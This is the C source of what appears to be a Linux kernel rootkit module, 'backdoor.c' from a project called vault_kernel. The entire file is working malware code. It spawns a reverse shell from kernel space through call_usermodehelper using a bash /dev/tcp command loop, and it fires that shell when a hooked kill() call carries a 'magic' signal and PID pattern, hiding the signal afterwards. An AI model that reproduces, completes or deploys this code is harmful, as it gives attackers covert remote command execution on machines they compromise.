/* vault_kernel - backdoor.c
 * Kernel backdoor: reverse shell via call_usermodehelper()
 * Magic packet trigger via kill() syscall to PID=SIGRTMIN+1
 * ruby570bocadito © 2026
 */
#include "core.h"

static char magic_str[16] = {0};
static int magic_enabled = 0;

/* The magic packet: send kill(SIGRTMIN+1, pid) where
 * pid encodes port in the upper 16 bits */
#define MAGIC_SIGNAL SIGRTMIN + 1
#define MAGIC_PORT(p) ((p) >> 16)
#define MAGIC_FLAG(p) ((p) & 0xFFFF)

static int reverse_shell_spawn(const char *ip, int port) {
    char *argv[] = { "/bin/bash", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL };
    char cmd[256];

    /* Use bash -c with /dev/tcp for reverse shell */
    snprintf(cmd, sizeof(cmd),
             "exec 5<>/dev/tcp/%s/%d; cat <&5 | while read line; do $line 2>&5 >&5; done &",
             ip, port);

    argv[2] = cmd;

    pr_info(VAULT_KERNEL_TAG " spawning reverse shell -> %s:%d\n", ip, port);

    return call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
}

/* Wrapper for workqueue-based spawning (safer) */
struct backdoor_work {
    struct work_struct work;
    char ip[64];
    int port;
};

static void backdoor_worker(struct work_struct *work) {
    struct backdoor_work *bw = container_of(work, struct backdoor_work, work);
    reverse_shell_spawn(bw->ip, bw->port);
    kfree(bw);
}

int backdoor_spawn_reverse_shell(const char *ip, int port) {
    struct backdoor_work *bw;

    bw = kmalloc(sizeof(*bw), GFP_KERNEL);
    if (!bw)
        return -ENOMEM;

    strncpy(bw->ip, ip, sizeof(bw->ip) - 1);
    bw->ip[sizeof(bw->ip) - 1] = '\0';
    bw->port = port;

    INIT_WORK(&bw->work, backdoor_worker);
    schedule_work(&bw->work);

    return 0;
}

int backdoor_trigger_shell(const char *ip, const char *port_str) {
    int port;
    if (kstrtoint(port_str, 10, &port))
        return -EINVAL;
    if (port < 1 || port > 65535)
        return -EINVAL;
    return backdoor_spawn_reverse_shell(ip, port);
}

int backdoor_set_magic(const char *magic) {
    strncpy(magic_str, magic, sizeof(magic_str) - 1);
    magic_str[sizeof(magic_str) - 1] = '\0';
    magic_enabled = 1;
    pr_info(VAULT_KERNEL_TAG " magic packet backdoor enabled: %s\n", magic_str);
    return 0;
}

/*
 * Check if a kill() call matches the magic packet pattern.
 * Pattern: kill(MAGIC_SIGNAL, <pid>) where pid encodes port.
 * Upper 16 bits of pid = port, lower 16 bits = 0xDEAD
 */
int backdoor_check_magic(pid_t pid, int sig) {
    if (!magic_enabled)
        return 0;

    if (sig != MAGIC_SIGNAL)
        return 0;

    if (MAGIC_FLAG(pid) != 0xDEAD)
        return 0;

    {
        int port = MAGIC_PORT(pid);
        pr_info(VAULT_KERNEL_TAG " magic packet received, spawning shell on port %d\n", port);

        /* Spawn reverse shell to localhost:port */
        backdoor_spawn_reverse_shell("127.0.0.1", port);
    }

    return 1; /* Signal handled — do not propagate */
}

int backdoor_init(void) {
    pr_info(VAULT_KERNEL_TAG " backdoor initialized\n");
    return 0;
}

void backdoor_cleanup(void) {
    magic_enabled = 0;
    memset(magic_str, 0, sizeof(magic_str));
    pr_info(VAULT_KERNEL_TAG " backdoor cleaned\n");
}
